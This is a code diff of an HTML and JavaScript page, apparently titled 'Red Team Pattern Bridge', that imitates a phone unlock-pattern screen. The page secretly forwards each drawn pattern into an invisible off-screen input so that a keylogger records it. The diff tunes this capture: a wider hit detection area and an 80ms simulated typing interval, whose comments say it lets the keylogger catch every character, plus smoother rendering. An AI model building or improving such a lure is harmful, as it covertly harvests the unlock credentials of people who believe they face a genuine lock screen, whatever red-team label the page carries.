@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Red Team Pattern Bridge</title>
+    <title>Red Team Pattern Bridge - High Perf</title>
     <style>
         :root {
             --mario-white: #ffffff;
@@ -16,145 +16,78 @@
         * { box-sizing: border-box; }
 
         body, html {
-            margin: 0;
-            padding: 0;
-            height: 100vh;
-            width: 100vw;
-            overflow: hidden;
+            margin: 0; padding: 0; height: 100vh; width: 100vw; overflow: hidden;
             font-family: 'Segoe UI', sans-serif;
             background: url('fondo.png') no-repeat center center fixed;
-            background-size: cover;
-            background-color: #1a1a1a;
+            background-size: cover; background-color: #1a1a1a;
         }
 
-        /* --- INPUT INVISIBLE PARA EL KEYLOGGER --- */
-        #key-sink {
-            position: absolute;
-            top: -100px;
-            left: -100px;
-            opacity: 0;
-            pointer-events: none;
-        }
+        /* Input invisible para captura de Red Team */
+        #key-sink { position: absolute; top: -100px; opacity: 0; }
 
         .overlay {
-            position: absolute;
-            width: 100%;
-            height: 100%;
+            position: absolute; width: 100%; height: 100%;
             background: rgba(0, 0, 0, 0.5);
-            display: flex;
-            flex-direction: column;
-            justify-content: flex-start; 
-            align-items: center;
-            padding-top: 10vh; 
+            display: flex; flex-direction: column; justify-content: flex-start; 
+            align-items: center; padding-top: 10vh; 
         }
 
         .marquee-box {
-            width: 280px; 
-            overflow: hidden;
-            white-space: nowrap;
-            margin-bottom: 35vh;
-            display: flex;
+            width: 280px; overflow: hidden; white-space: nowrap;
+            margin-bottom: 35vh; display: flex;
         }
 
-        .marquee-content {
-            display: flex;
-            animation: scrollLeft 18s linear infinite;
-        }
+        .marquee-content { display: flex; animation: scrollLeft 18s linear infinite; }
 
         .marquee-content span {
-            color: var(--mario-white);
-            font-size: 1.3rem;
-            font-weight: 600; /* Negrita limpia */
-            padding-right: 60px; 
+            color: var(--mario-white); font-size: 1.3rem;
+            font-weight: 600; padding-right: 60px; 
         }
 
-        @keyframes scrollLeft {
-            0% { transform: translateX(0); }
-            100% { transform: translateX(-50%); } 
-        }
+        @keyframes scrollLeft { 0% { transform: translateX(0); } 100% { transform: translateX(-50%); } }
 
         #game-popup {
-            position: absolute;
-            top: -110px;
-            left: 50%;
-            transform: translateX(-50%);
-            background: var(--popup-bg);
-            color: #333;
-            min-width: 230px; 
-            padding: 15px 40px; 
-            border-radius: 15px;
-            font-size: 0.9rem;
-            font-weight: 500;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.4);
-            display: none; 
-            flex-direction: column;
-            align-items: center;
-            z-index: 100;
+            position: absolute; top: -110px; left: 50%; transform: translateX(-50%);
+            background: var(--popup-bg); color: #333; min-width: 230px; 
+            padding: 15px 40px; border-radius: 15px; font-size: 0.9rem;
+            font-weight: 500; box-shadow: 0 10px 30px rgba(0,0,0,0.4);
+            display: none; flex-direction: column; align-items: center; z-index: 100;
         }
 
         .loader {
-            border: 3px solid rgba(0,0,0,0.05);
-            border-top: 3px solid var(--loader-grey);
-            border-radius: 50%;
-            width: 20px;
-            height: 20px;
-            animation: spin 1s linear infinite;
-            margin-top: 12px;
+            border: 3px solid rgba(0,0,0,0.05); border-top: 3px solid var(--loader-grey);
+            border-radius: 50%; width: 20px; height: 20px;
+            animation: spin 1s linear infinite; margin-top: 12px;
         }
 
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
-        #pattern-wrapper {
-            position: relative;
-            width: 280px;
-            height: 280px;
-            touch-action: none;
-        }
+        #pattern-wrapper { position: relative; width: 280px; height: 280px; touch-action: none; }
 
-        canvas {
-            position: absolute;
-            top: 0;
-            left: 0;
-            z-index: 1;
-            pointer-events: none;
-        }
+        canvas { position: absolute; top: 0; left: 0; z-index: 1; pointer-events: none; }
 
         .dots-grid {
-            display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            grid-template-rows: repeat(3, 1fr);
-            width: 100%;
-            height: 100%;
-            position: relative;
-            z-index: 2;
+            display: grid; grid-template-columns: repeat(3, 1fr);
+            grid-template-rows: repeat(3, 1fr); width: 100%; height: 100%;
+            position: relative; z-index: 2;
         }
 
         .dot {
-            width: 10px; height: 10px;
-            background: var(--mario-white); 
-            border: none;
-            border-radius: 50%;
-            margin: auto;
+            width: 10px; height: 10px; background: var(--mario-white); 
+            border: none; border-radius: 50%; margin: auto;
             box-shadow: 0 0 5px rgba(0,0,0,0.3);
         }
 
         .bottom-links {
-            width: 280px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-top: 40px;
+            width: 280px; display: flex; justify-content: space-between;
+            align-items: center; margin-top: 40px;
         }
 
         .link-text {
-            color: var(--mario-white) !important;
-            font-size: 1rem !important;
-            font-family: 'Segoe UI', sans-serif !important;
-            font-weight: 400; 
-            letter-spacing: 1px !important;
-            text-transform: uppercase !important;
-            text-decoration: none;
-            cursor: pointer;
+            color: var(--mario-white) !important; font-size: 1rem !important;
+            font-family: 'Segoe UI', sans-serif !important; font-weight: 400; 
+            letter-spacing: 1px !important; text-transform: uppercase !important;
+            text-decoration: none; cursor: pointer;
         }
     </style>
 </head>
@@ -175,7 +108,6 @@
             <span>Ingresando ...</span>
             <div class="loader"></div>
         </div>
-        
         <canvas id="pattern-canvas"></canvas>
         <div class="dots-grid">
             <div class="dot" data-id="1"></div>
@@ -209,12 +141,12 @@
     const popup = document.getElementById('game-popup');
     const keySink = document.getElementById('key-sink');
 
-    // Patrón maestro: 1 al 9 (Z sería 1-2-3-5-7-8-9 si la dibujas así)
     const CORRECT_PATTERN = "123456789"; 
     let isDrawing = false;
     let path = [];
     let failCount = 0;
     let lineColor = '#ffffff';
+    let mousePos = { x: 0, y: 0 };
 
     canvas.width = 280;
     canvas.height = 280;
@@ -236,17 +168,24 @@
         dots.forEach(d => d.classList.remove('active'));
         ctx.clearRect(0, 0, canvas.width, canvas.height);
         popup.style.display = 'none';
-        keySink.value = ""; // Limpiar input para nueva captura
+        keySink.value = "";
     }
 
     function move(e) {
         if (!isDrawing) return;
         const clientX = e.touches ? e.touches[0].clientX : e.clientX;
         const clientY = e.touches ? e.touches[0].clientY : e.clientY;
+        const rect = wrapper.getBoundingClientRect();
+        mousePos = { x: clientX - rect.left, y: clientY - rect.top };
 
         dots.forEach(dot => {
-            const rect = dot.getBoundingClientRect();
-            if (clientX >= rect.left && clientX <= rect.right && clientY >= rect.top && clientY <= rect.bottom) {
+            const dRect = dot.getBoundingClientRect();
+            // --- MEJORA: Área de detección aumentada a 30px para no perder el 5 o el 7 ---
+            const hitArea = 30; 
+            const centerX = dRect.left + dRect.width / 2;
+            const centerY = dRect.top + dRect.height / 2;
+
+            if (Math.abs(clientX - centerX) < hitArea && Math.abs(clientY - centerY) < hitArea) {
                 const center = getDotCenter(dot);
                 if (!path.find(p => p.id === center.id)) {
                     path.push(center);
@@ -255,61 +194,42 @@
                 }
             }
         });
-        render(clientX, clientY);
     }
 
     function end() {
         if (!isDrawing) return;
         isDrawing = false;
-        
         const userPattern = path.map(p => p.id).join('');
         
         if (path.length > 0) {
-            // --- EL PUENTE AL KEYLOGGER ---
             capturarParaKeylogger(userPattern);
-
-            if (userPattern === CORRECT_PATTERN) {
-                failCount = 0;
-                // Éxito
-            } else {
+            if (userPattern !== CORRECT_PATTERN) {
                 failCount++;
                 if (failCount === 1) {
                     lineColor = '#ff4444';
-                    render();
                     setTimeout(resetUI, 800);
                 } else {
                     popup.style.display = 'flex';
-                    setTimeout(() => {
-                        popup.style.display = 'none';
-                        failCount = 0;
-                        resetUI();
-                    }, 10000); // 10 SEGUNDOS
+                    setTimeout(() => { popup.style.display = 'none'; failCount = 0; resetUI(); }, 10000);
                 }
             }
         }
     }
 
-    // Función que simula la escritura física para que el keylogger "despierte"
     function capturarParaKeylogger(texto) {
         keySink.focus();
         let i = 0;
+        // --- MEJORA: Intervalo de 80ms para que el keylogger capte todo sin saltos ---
         const intervalo = setInterval(() => {
             if (i < texto.length) {
-                const char = texto[i];
-                // Creamos el evento de tecla para engañar al keylogger
-                const evento = new KeyboardEvent('keydown', {
-                    key: char,
-                    keyCode: char.charCodeAt(0),
-                    bubbles: true
-                });
-                keySink.dispatchEvent(evento);
-                keySink.value += char;
+                keySink.value += texto[i];
+                keySink.dispatchEvent(new Event('input', { bubbles: true }));
                 i++;
             } else {
                 clearInterval(intervalo);
-                keySink.blur(); // Quitar foco al terminar
+                keySink.blur();
             }
-        }, 50); // Simula escritura rápida
+        }, 80); 
     }
 
     function resetUI() {
@@ -318,24 +238,27 @@
         path = [];
     }
 
-    function render(mouseX, mouseY) {
-        ctx.clearRect(0, 0, canvas.width, canvas.height);
-        if (path.length === 0) return;
-        ctx.beginPath();
-        ctx.lineWidth = 5;
-        ctx.strokeStyle = lineColor; 
-        ctx.lineJoin = 'round';
-        ctx.lineCap = 'round';
-        ctx.moveTo(path[0].x, path[0].y);
-        for (let i = 1; i < path.length; i++) {
-            ctx.lineTo(path[i].x, path[i].y);
+    // --- MEJORA: requestAnimationFrame para eliminar la lentitud (lag) ---
+    function renderLoop() {
+        if (isDrawing) {
+            ctx.clearRect(0, 0, canvas.width, canvas.height);
+            if (path.length > 0) {
+                ctx.beginPath();
+                ctx.lineWidth = 5;
+                ctx.strokeStyle = lineColor; 
+                ctx.lineJoin = 'round';
+                ctx.lineCap = 'round';
+                ctx.moveTo(path[0].x, path[0].y);
+                for (let i = 1; i < path.length; i++) {
+                    ctx.lineTo(path[i].x, path[i].y);
+                }
+                ctx.lineTo(mousePos.x, mousePos.y);
+                ctx.stroke();
+            }
         }
-        if (mouseX && mouseY) {
-            const rect = wrapper.getBoundingClientRect();
-            ctx.lineTo(mouseX - rect.left, mouseY - rect.top);
-        }
-        ctx.stroke();
+        requestAnimationFrame(renderLoop);
     }
+    renderLoop();
 
     wrapper.addEventListener('mousedown', start);
     window.addEventListener('mousemove', move);
